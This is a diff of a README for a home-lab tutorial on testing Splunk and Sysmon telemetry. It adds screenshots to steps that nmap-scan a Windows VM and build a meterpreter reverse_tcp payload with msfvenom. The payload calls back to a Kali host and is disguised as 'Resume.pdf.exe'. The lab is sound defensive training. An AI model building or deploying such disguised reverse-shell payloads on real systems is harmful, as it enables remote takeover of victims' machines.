@@ -461,11 +461,23 @@ Step 7: This should add additional field when searching “index=endpoint”.
 <img width="975" height="800" alt="image" src="https://github.com/user-attachments/assets/07cd3bee-5729-48e2-abe7-079a53dba63c" />
 
 #### Creating and Using Malware To Test and Analyze Splunk and Sysmon Telemetry
-Step 1: Make sure to use “Internal Network” Settings for Windows 11 Pro and Kali Linux VM.    
-Step 2: Verify Win11 Pro VM and Kali VM are on the same network and have the appropriate IP addressing.    
+Step 1: Make sure to use “Internal Network” Settings for Windows 11 Pro and Kali Linux VM. 
+<img width="975" height="656" alt="image" src="https://github.com/user-attachments/assets/64b0b32d-8856-44cf-b2d6-ee4f25522a70" />
+<img width="975" height="1052" alt="image" src="https://github.com/user-attachments/assets/2b4eab01-0182-4736-8b72-998a36a401ee" />
+<img width="975" height="621" alt="image" src="https://github.com/user-attachments/assets/f7ca356c-adad-4a43-a46c-d54865d1e967" />
+
+Step 2: Verify Win11 Pro VM and Kali VM are on the same network and have the appropriate IP addressing.
+<img width="975" height="806" alt="image" src="https://github.com/user-attachments/assets/5ef23730-7088-4b7a-8473-8023ee3fe74f" />
+<img width="975" height="835" alt="image" src="https://github.com/user-attachments/assets/5b8d7fde-1dc6-4b1c-b45e-462a098004bd" />
+
 Step 3: Keep both IP addresses in mind. Win11 = 192.168.20.10 & Kali = 192.168.20.11
-Step 4: Lets get started with NMAP by viewing the available commands. In the terminal do command “nmap -h”.  There are plenty of useful commands to use. For example “-A” will do a full scan aand adding a -Pn will skip pings.     
+Step 4: Lets get started with NMAP by viewing the available commands. In the terminal do command “nmap -h”.  There are plenty of useful commands to use. For example “-A” will do a full scan aand adding a -Pn will skip pings.
+<img width="975" height="846" alt="image" src="https://github.com/user-attachments/assets/5a995628-67e8-457f-bab5-90b4d738bc67" />
+<img width="965" height="142" alt="image" src="https://github.com/user-attachments/assets/dd029763-cfa9-4159-8522-e324925ec877" />
+
 Step 5: Lets do command “nmap -A 192.168.20.10 -Pn” to scan our Windows 11 VM and skipping ping to see what information we receive from the Win 11 VM.   
+<img width="975" height="840" alt="image" src="https://github.com/user-attachments/assets/bcada209-3f0d-46b8-83c1-92804453af45" />
+
 Step 5: Lets create our malware using msfvenom. Do command “msfvenom + enter” in terminal.   
 Step 6: Lets see the available payloads we have by doing command “msfvenom -l payloads”. There will be plenty listed but we are using the “windows/x64/meterpreter/reverse_tcp” payload. Take note of  “windows/x64/meterpreter/reverse_tcp” since that is the one we will use. 
 Step 7: Lets start by building out our malware. Do command “msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe + enter”. This command will generate malware using reverse tcp payload which is instructed to connect back to our kali machine and port. The file format will be .exe and file name is Resume.pdf.exe.  
